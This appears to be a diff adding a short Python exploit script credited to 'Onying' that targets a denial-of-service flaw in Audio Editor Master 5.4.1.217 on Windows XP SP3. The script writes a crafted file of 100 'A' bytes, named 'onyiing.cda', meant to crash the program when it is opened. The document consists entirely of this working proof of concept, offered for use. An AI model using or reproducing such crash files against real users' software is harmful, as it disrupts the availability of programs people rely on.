@@ -1,0 +1,16 @@
+#!/usr/bin/python
+#
+# Exploit Title: Audio Editor Master 5.4.1.217 Denial Of Service Vulnerability
+# software: Audio Editor Master
+# version : 5.4.1.217
+# Tested on: Windows XP SP3
+# link: http://www.audioeditor.com
+# Author: Onying (@onyiing)
+# Blog: otakku-udang.blogspot.com
+# from : Information Security Shinobi Camp (http://is2c-dojo.com)
+
+junk ="\x41"*100
+textfile = open("onyiing.cda" , 'w')
+textfile.write(junk)
+textfile.close()
+
